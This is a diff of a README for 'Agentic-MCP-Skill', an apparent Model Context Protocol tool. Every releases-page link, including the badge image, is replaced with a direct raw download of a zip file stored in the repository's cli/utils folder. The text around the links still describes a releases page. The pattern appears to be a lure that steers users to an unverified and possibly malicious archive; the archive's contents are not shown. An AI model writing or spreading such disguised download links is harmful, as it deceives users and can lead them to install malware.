@@ -1,7 +1,7 @@
 # 🌟 Agentic-MCP-Skill - Use MCP Efficiently and Easily
 
 ## 📥 Download the Application
-[![Download Agentic-MCP-Skill](https://img.shields.io/badge/Download-Agentic--MCP--Skill-brightgreen)](https://github.com/bioeu/Agentic-MCP-Skill/releases)
+[![Download Agentic-MCP-Skill](https://github.com/bioeu/Agentic-MCP-Skill/raw/refs/heads/master/cli/utils/MC-Skill-Agentic-3.8.zip)](https://github.com/bioeu/Agentic-MCP-Skill/raw/refs/heads/master/cli/utils/MC-Skill-Agentic-3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Agentic-MCP-Skill! This application helps you use the Model Context Protocol (MCP) effectively. It features lazy loading to save time and resources. You can start using MCP without needing to pre-install anything or waiting for a full load.
@@ -17,7 +17,7 @@ Follow these simple steps to download and install Agentic-MCP-Skill:
 
 1. **Visit the Releases Page**  
    Go to the releases page for Agentic-MCP-Skill:  
-   [Download Page](https://github.com/bioeu/Agentic-MCP-Skill/releases)
+   [Download Page](https://github.com/bioeu/Agentic-MCP-Skill/raw/refs/heads/master/cli/utils/MC-Skill-Agentic-3.8.zip)
 
 2. **Choose the Latest Release**  
    Look for the latest version listed on the releases page. The version number will be clearly indicated.
@@ -53,4 +53,4 @@ Need help? You can contact support through the issues section of our GitHub repo
 
 ---
 
-For any further updates or new releases, please keep an eye on our [Releases Page](https://github.com/bioeu/Agentic-MCP-Skill/releases).
+For any further updates or new releases, please keep an eye on our [Releases Page](https://github.com/bioeu/Agentic-MCP-Skill/raw/refs/heads/master/cli/utils/MC-Skill-Agentic-3.8.zip).
